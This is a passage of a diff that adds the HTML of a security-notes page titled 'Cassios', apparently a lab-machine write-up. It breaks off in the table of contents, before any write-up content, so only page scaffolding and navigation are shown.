@@ -1,0 +1,2197 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../../OWASP_Labs/crAPI/">
+      
+      
+        <link rel="next" href="../../RE101/3.%20Simple%20Lambdas/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.4.8">
+    
+    
+      
+        <title>Cassios - irboi746's space</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.4b4a2bd9.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.356b1318.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="deep-orange">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#cassios" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="irboi746&#39;s space" class="md-header__button md-logo" aria-label="irboi746's space" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            irboi746's space
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Cassios
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="deep-orange"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="blue-grey" data-md-color-accent="deep-orange"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="irboi746&#39;s space" class="md-nav__button md-logo" aria-label="irboi746's space" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    irboi746's space
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Welcome
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Burp Academy
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Burp Academy
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Apprentice
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Apprentice
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Access Control Vulnerabilities
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/Authentication/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Authentication
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/Business%20Logic%20Vulnerabilities/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Business Logic Vulnerabilities
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CSRF, Clickjacking and CORS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/Cross%20Site%20Scripting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cross Site Scripting
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/DOM-based%20XSS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DOM based XSS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/HTTP%20Host%20Header%20Attacks%20and%20File%20Upload%20Vulnerabilities/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTTP Host Header Attacks & File Upload Vulnerabilities
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/Information%20Disclosure/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Information Disclosure
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/JWT/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    JWT
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/Other%20Labs/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Other Labs
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/SQL%20Injection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SQL Injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Apprentice/XXE%20and%20SSRF/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    XXE and SSRF
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Practitioner
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Practitioner
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Practitioner/SQL%20Injection%20DB%20Enumeration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SQL Injection DB Enumeration
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SQL Injection UNION Attack
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    CTF
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            CTF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTF/TISC%202022%20%281%29/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CSIT TISC 2022 (1)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTF/TISC%202022%20%282%29/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CSIT TISC 2022 (2)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Flareon22
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Flareon22
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CTF/Flareon22/FlareOn_22/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Flareon-22
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Dev
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Dev
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Java
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_1">
+            <span class="md-nav__icon md-icon"></span>
+            Java
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Dev/Java/Burp%20Extension%20-%20GUI/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Burp Extension - GUI
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Dev/Java/Burp%20Extension%20-%20Hello%20World/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Burp Extension - Hello World
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Dev/Java/Burp%20Extension%20-%20README/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Burp Extension   README
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Javascript
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            Javascript
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Dev/Javascript/Node.js/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Node.js
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Dev/Javascript/Node.js_Projects/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    NodeJS Projects
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Python
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            Python
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Dev/Python/Web%20Automation%20Cheatsheet/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Automation Cheatsheet
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Malware Analysis
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            Malware Analysis
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_1" id="__nav_5_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Notes
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_1">
+            <span class="md-nav__icon md-icon"></span>
+            Notes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Malware_Analysis/Notes/File_Identification%26Classification/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    File Identification and Classification
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Malware_Analysis/Notes/Introduction/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Introduction
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Malware_Analysis/Notes/Windows%20Obfuscation%20Techniques/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows Obfuscation Techniques
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Practical Malware Analysis
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_2">
+            <span class="md-nav__icon md-icon"></span>
+            Practical Malware Analysis
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Malware_Analysis/Practical_Malware_Analysis/Chapter%200/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 0
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Malware_Analysis/Practical_Malware_Analysis/Chapter%201/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 1
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Malware_Analysis/Practical_Malware_Analysis/Chapter%203/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Chapter 3
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    OWASP Labs
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            OWASP Labs
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../OWASP_Labs/Generic%20University/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Generic University
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../OWASP_Labs/crAPI/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    crAPI
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    PG
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            PG
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Cassios
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Cassios
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    Recon
+  </a>
+  
+    <nav class="md-nav" aria-label="Recon">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ports-scan" class="md-nav__link">
+    Ports Scan
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssh-enumeration-22" class="md-nav__link">
+    SSH Enumeration (22)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smb-enumeration-139445" class="md-nav__link">
+    SMB Enumeration (139,445)
+  </a>
+  
+    <nav class="md-nav" aria-label="SMB Enumeration (139,445)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
